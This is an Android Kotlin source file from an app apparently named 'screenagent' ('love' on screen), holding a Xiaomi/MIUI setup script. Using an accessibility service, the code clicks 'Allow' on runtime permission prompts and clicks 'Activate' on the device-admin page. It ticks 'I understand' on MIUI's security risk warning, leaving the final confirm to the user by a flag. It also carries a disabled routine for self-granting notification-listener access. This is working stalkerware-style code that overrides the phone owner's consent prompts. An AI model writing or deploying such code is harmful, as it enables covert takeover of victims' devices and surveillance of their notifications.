package com.zaka.screenagent.flow

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import com.zaka.screenagent.admin.MoyingAdminReceiver
import com.zaka.screenagent.perm.MiuiNavigator
import com.zaka.screenagent.perm.PermissionClicker
import com.zaka.screenagent.perm.PermissionFlow

/**
 * ─────────────── 小米（MIUI / HyperOS / Redmi / POCO）引导脚本 ───────────────
 *
 * 一个文件就是一整套流程，按顺序像脚本一样读：
 *
 *   start()
 *     ├─ step1_权限()        申请 9 项运行时权限，自动点「允许」
 *     ├─ step2_设备管理()    打开激活页 → 点「激活」→ 危险页（2s 勾选 / 10s 确定）
 *     └─ step3_收尾()        校验 isAdminActive → 结束（通知/电池暂不做）
 *
 * 每一步的具体实现都在本文件下方，不依赖其它厂商的任何代码。
 * 以后加步骤就在 start() 里插一行，其它文件不用动。
 */
object MiuiFlow : VendorFlow {

    private const val TAG = "Flow(MIUI)"
    private val ui = Handler(Looper.getMainLooper())

    /** 第 3 步（通知使用权）开关：先关掉，只验证 权限 → 设备管理员 两步 */
    private const val STEP3_ENABLED = false

    /** 「危险」页里是否自动点「确定」：false = 只勾「我已知晓」，确定留给用户手动点 */
    private const val AUTO_CONFIRM = false

    /** 交给 PermissionActivity 的 extra：true 表示"打开设备管理激活页" */
    const val OPEN_ADMIN_EXTRA = "open_admin_page"

    // ───────────────────────────── 主流程 ─────────────────────────────

    override fun start(service: BoundaryAccessibilityService, noAutoClick: Boolean) {
        Log.d(TAG, "===== MIUI 引导开始 =====")
        // 与本流程无关的通用接力全部关掉（小米只跑自己的两步）
        com.zaka.screenagent.admin.AdminActivator.chainToNotification = false
        com.zaka.screenagent.admin.AdminActivator.autoclick = !noAutoClick
        com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = !noAutoClick
        com.zaka.screenagent.perm.PermissionActivity.chainToAdmin = false

        step1_权限(service) { granted ->
            if (!granted) {
                Log.w(TAG, "step1 未拿到全部权限，仍继续尝试设备管理")
            }
            step2_设备管理(service) { active ->
                if (!STEP3_ENABLED) {
                    Log.d(TAG, "step3: 已暂时关闭（先只验证前两步）")
                    step4_收尾(active, false)
                } else {
                    step3_通知使用权(service) { granted ->
                        step4_收尾(active, granted)
                    }
                }
            }
        }
    }

    // ───────────────────── 公共：MIUI「危险」弹窗处理 ─────────────────────
    //
    // 无障碍 / 设备管理员 / 通知使用权 弹的都是同一个模板，所以统一封装：
    //   检测到 → 等 2 秒点「我已知晓」→ 再等 10 秒点「确定」→ 校验弹窗消失
    // 调用方只关心"有没有处理"。

    private fun passRiskIfAny(
        service: BoundaryAccessibilityService,
        where: String,
        onDone: (Boolean) -> Unit
    ) {
        if (!MiuiNavigator.onRiskDialog(service)) {
            Log.d(TAG, "$where: 无危险页")
            onDone(false)
            return
        }
        Log.d(TAG, "$where: 危险页 -> 2s 勾选 / 10s 确定")
        MiuiNavigator.passRiskDialog(service, autoConfirm = AUTO_CONFIRM) { ok ->
            Log.d(TAG, "$where: 危险页处理=$ok")
            onDone(ok)
        }
    }

    // ─────────────────────── 第 1 步：运行时权限 ───────────────────────

    private fun step1_权限(service: BoundaryAccessibilityService, done: (Boolean) -> Unit) {
        Log.d(TAG, "step1: 申请运行时权限（缺 ${missing(service)} 项）")
        PermissionClicker.start(service)
        openPermissionActivity(service, 1)

        var tries = 0
        fun poll() {
            val m = missing(service)
            if (m == 0) {
                Log.d(TAG, "step1: 权限已全部授予")
                done(true); return
            }
            if (tries++ > 30) { Log.w(TAG, "step1: 超时，仍缺 $m 项"); done(false); return }
            ui.postDelayed({ poll() }, 2_000L)
        }
        ui.postDelayed({ poll() }, 2_000L)
    }

    /** 拉起权限页；12 秒还没拿全就再来一次（最多 3 次） */
    private fun openPermissionActivity(service: BoundaryAccessibilityService, attempt: Int) {
        if (missing(service) == 0) return
        Log.d(TAG, "step1: 打开权限页 attempt=$attempt")
        runCatching {
            service.startActivity(
                Intent(service, com.zaka.screenagent.perm.PermissionActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }.onFailure { Log.w(TAG, "step1: 打开权限页失败 $it") }
        // MIUI 会丢弃第一次后台启动的 Activity，所以 2 秒一次快速重试
        if (attempt < 6) {
            ui.postDelayed({ if (missing(service) > 0) openPermissionActivity(service, attempt + 1) }, 2_000L)
        }
    }

    private fun missing(service: BoundaryAccessibilityService): Int =
        PermissionFlow.PERMISSIONS.count {
            androidx.core.content.ContextCompat.checkSelfPermission(service, it) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED
        }

    // ─────────────────────── 第 2 步：设备管理 ───────────────────────

    private fun step2_设备管理(service: BoundaryAccessibilityService, done: (Boolean) -> Unit) {
        Log.d(TAG, "step2: 打开设备管理激活页")
        // 激活页只能由前台 Activity 拉起，这里借 PermissionActivity 当载体（同文件不新增类）
        runCatching {
            service.startActivity(
                Intent(service, com.zaka.screenagent.perm.PermissionActivity::class.java)
                    .putExtra(OPEN_ADMIN_EXTRA, true)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }.onFailure { Log.w(TAG, "step2: 打开激活页失败 $it") }

        // 1.5 秒后点一次「启用此设备管理应用」（只点一次，不轮询）
        ui.postDelayed({ Log.d(TAG, "step2: 点击「启用」= ${clickActivateOnce(service)}") }, 4_000L)

        // 危险页：出现就 2 秒勾选、10 秒确定（封装好的方法）
        var ticks = 0
        fun watch() {
            if (MiuiNavigator.onRiskDialog(service)) {
                passRiskIfAny(service, "step2") { _ ->
                    val active = MoyingAdminReceiver.isActive(service)
                    Log.d(TAG, "step2: 管理员=$active")
                    done(active)
                }
                return
            }
            if (ticks++ > 40) {
                val active = MoyingAdminReceiver.isActive(service)
                Log.w(TAG, "step2: 等危险页超时 admin=$active")
                done(active); return
            }
            ui.postDelayed({ watch() }, 1_500L)
        }
        ui.postDelayed({ watch() }, 6_000L)
    }

    /** 只在系统激活页（DeviceAdminAdd）里点一次「启用」，其它页面一律不动 */
    private fun clickActivateOnce(service: BoundaryAccessibilityService): Boolean {
        val root = service.rootInActiveWindow ?: return false
        if (root.packageName?.toString() != "com.android.settings") return false
        if (!root.className?.toString().orEmpty().contains("DeviceAdminAdd")) {
            Log.d(TAG, "step2: 当前不在激活页（${root.className}）")
            return false
        }
        for (t in ACTIVATE_TEXTS) {
            val n = byText(root, t, 0) ?: continue
            if (!n.isEnabled) continue
            if (n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            if (tapNode(service, n)) return true
        }
        byId(root, "action_button", 0)?.let { n ->
            if (n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            if (tapNode(service, n)) return true
        }
        return false
    }

    private val ACTIVATE_TEXTS = listOf(
        "启用此设备管理应用", "启用设备管理应用", "启用", "激活",
        "Activate this device admin app", "Activate", "Enable",
        "Activar esta aplicación de administración", "Activar",
        "Ativar este app de administração de dispositivo", "Ativar"
    )

    private fun tapNode(service: BoundaryAccessibilityService, node: AccessibilityNodeInfo): Boolean =
        MiuiNavigator.tapByGesture(service, node)

    private fun byId(n: AccessibilityNodeInfo?, suffix: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.viewIdResourceName.orEmpty().endsWith(suffix)) return n
        for (i in 0 until n.childCount) byId(n.getChild(i), suffix, d + 1)?.let { return it }
        return null
    }

    private fun byText(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.text?.toString() == want) return n
        for (i in 0 until n.childCount) byText(n.getChild(i), want, d + 1)?.let { return it }
        return null
    }

    // ─────────────────── 第 3 步：通知使用权（小米同款入口） ───────────────────

    /**
     * 小米的通知使用权入口：`ACTION_NOTIFICATION_LISTENER_SETTINGS`
     *   列表页（NotificationAccessSettingsActivity）→ 点「love」这一行
     *   → 详情页（NotificationAccessDetails）→ 点「授予通知使用权」开关
     *   → 若弹「危险」页 → 等 2 秒勾选 → 10 秒点确定
     *   → 校验 enabled_notification_listeners 是否包含本应用（系统有 ~10 秒绑定延迟）
     */
    private fun step3_通知使用权(service: BoundaryAccessibilityService, done: (Boolean) -> Unit) {
        if (com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)) {
            Log.d(TAG, "step3: 通知使用权已授权，跳过")
            done(true); return
        }
        Log.d(TAG, "step3: 打开通知使用权设置页")
        var navTries = 0
        fun openPage() {
            runCatching {
                service.startActivity(
                    Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                )
            }.onFailure { Log.w(TAG, "step3: 打开设置页失败 $it") }
            if (++navTries < 4) ui.postDelayed({
                if (!com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service) &&
                    !isListOrDetail(service)) openPage()
            }, 2_000L)
        }
        openPage()

        // 列表页点自己那一行 → 详情页点开关 → 危险页 → 等待系统绑定
        var ticks = 0
        var rowClicked = false
        var toggleClicked = false
        fun drive() {
            if (com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)) {
                Log.d(TAG, "step3: 已授权")
                done(true); return
            }
            // 危险页优先处理
            if (MiuiNavigator.onRiskDialog(service)) {
                passRiskIfAny(service, "step3") { ok -> Log.d(TAG, "step3: 继续 granted=${com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)}") }
            } else if (!rowClicked) {
                val hit = MiuiNavigator.clickByText(service, appLabel(service), contains = false)
                if (hit) { rowClicked = true; Log.d(TAG, "step3: 点到自己那一行") }
            } else if (!toggleClicked) {
                var hit = false
                for (t in MiuiNavigator.NOTI_ACCESS_TEXTS) {
                    if (MiuiNavigator.clickByText(service, t, contains = true)) { hit = true; break }
                }
                if (!hit) hit = MiuiNavigator.clickAppSwitch(service)
                if (hit) { toggleClicked = true; Log.d(TAG, "step3: 点了允许开关") }
            }
            if (ticks++ > 40) {                       // ≈ 60 秒
                val g = com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)
                Log.w(TAG, "step3: 超时 granted=$g")
                done(g); return
            }
            ui.postDelayed({ drive() }, 1_500L)
        }
        ui.postDelayed({ drive() }, 4_000L)
    }

    private fun isListOrDetail(service: BoundaryAccessibilityService): Boolean {
        val cls = runCatching { service.rootInActiveWindow?.className?.toString().orEmpty() }.getOrDefault("")
        return cls.contains("NotificationAccess") || cls.contains("SubSettings")
    }

    private fun appLabel(service: BoundaryAccessibilityService): String =
        runCatching {
            service.packageManager.getApplicationLabel(service.applicationInfo).toString()
        }.getOrDefault("love")

    // ───────────────────────── 第 4 步：收尾 ─────────────────────────

    private fun step4_收尾(adminActive: Boolean, notiGranted: Boolean) {
        Log.d(TAG, "step4: 管理员=$adminActive 通知使用权=$notiGranted -> 结束（电池未接）")
        Log.d(TAG, "===== MIUI 引导结束 =====")
    }
}

/**
 * 小米专用的设备管理激活页载体（同文件，不单独建类文件）。
 * 前台 Activity 才能拉起系统激活页（MIUI 拦后台启动），所以必须有它。
 */
